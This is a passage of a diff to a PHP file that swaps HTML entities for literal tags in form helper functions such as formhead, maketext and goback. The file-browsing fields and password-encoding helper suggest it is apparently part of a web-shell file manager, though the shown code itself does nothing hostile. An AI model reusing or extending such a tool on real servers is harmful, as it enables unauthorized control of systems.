-						p("&lt;option value=\"$key\" selected&gt;$value&lt;/option&gt;");
+						p("<option value=\"$key\" selected>$value</option>");
 					} else {
-						p("&lt;option value=\"$key\"&gt;$value&lt;/option&gt;");
+						p("<option value=\"$key\">$value</option>");
 					}
 				}
 			}
 		}
-	p("&lt;/select&gt;");
-	if ($arg['newline']) p('&lt;/p&gt;');
+	p("</select>");
+	if ($arg['newline']) p('</p>');
 }
 function formhead($arg = array()) {
 	global $self;
@@ -2121,32 +2121,32 @@ function formhead($arg = array()) {
 	!$arg['action'] && $arg['action'] = $self;
 	$arg['target'] = $arg['target'] ? "target=\"$arg[target]\"" : '';
 	!$arg['name'] && $arg['name'] = 'form1';
-	p("&lt;form name=\"$arg[name]\" id=\"$arg[name]\" action=\"$arg[action]\" method=\"$arg[method]\" $arg[target]&gt;");
+	p("<form name=\"$arg[name]\" id=\"$arg[name]\" action=\"$arg[action]\" method=\"$arg[method]\" $arg[target]>");
 	if ($arg['title']) {
-		p('&lt;h2&gt;'.$arg['title'].' &raquo;&lt;/h2&gt;');
+		p('<h2>'.$arg['title'].' &raquo;</h2>');
 	}
 }
 	
 function maketext($arg = array()){
 	!$arg['cols'] && $arg['cols'] = 100;
 	!$arg['rows'] && $arg['rows'] = 25;
-	$arg['title'] = $arg['title'] ? $arg['title'].'&lt;br /&gt;' : '';
-	p("&lt;p&gt;$arg[title]&lt;textarea class=\"area\" id=\"$arg[name]\" name=\"$arg[name]\" cols=\"$arg[cols]\" rows=\"$arg[rows]\" $arg[extra]&gt;$arg[value]&lt;/textarea&gt;&lt;/p&gt;");
+	$arg['title'] = $arg['title'] ? $arg['title'].'<br />' : '';
+	p("<p>$arg[title]<textarea class=\"area\" id=\"$arg[name]\" name=\"$arg[name]\" cols=\"$arg[cols]\" rows=\"$arg[rows]\" $arg[extra]>$arg[value]</textarea></p>");
 }
 
 function formfooter($name = ''){
 	!$name && $name = 'submit';
-	p('&lt;p&gt;&lt;input class="bt" name="'.$name.'" id="'.$name.'" type="submit" value="Submit"&gt;&lt;/p&gt;');
-	p('&lt;/form&gt;');
+	p('<p><input class="bt" name="'.$name.'" id="'.$name.'" type="submit" value="Submit"></p>');
+	p('</form>');
 }
 
 function goback(){
 	global $self, $nowpath;
-	p('&lt;form action="'.$self.'" method="post"&gt;&lt;input type="hidden" name="action" value="file" /&gt;&lt;input type="hidden" name="dir" value="'.$nowpath.'" /&gt;&lt;p&gt;&lt;input class="bt" type="submit" value="Go back..."&gt;&lt;/p&gt;&lt;/form&gt;');
+	p('<form action="'.$self.'" method="post"><input type="hidden" name="action" value="file" /><input type="hidden" name="dir" value="'.$nowpath.'" /><p><input class="bt" type="submit" value="Go back..."></p></form>');
 }
 
 function formfoot(){
-	p('&lt;/form&gt;');
+	p('</form>');
 }
 
 function encode_pass($pass) {
@@ -2157,7 +2157,7 @@ function encode_pass($pass) {
 }
 
 function pr($s){
-	echo "&lt;pre&gt;".print_r($s).'&lt;/pre&gt;';
+	echo "<pre>".print_r($s).'</pre>';
 }
 
 ?>
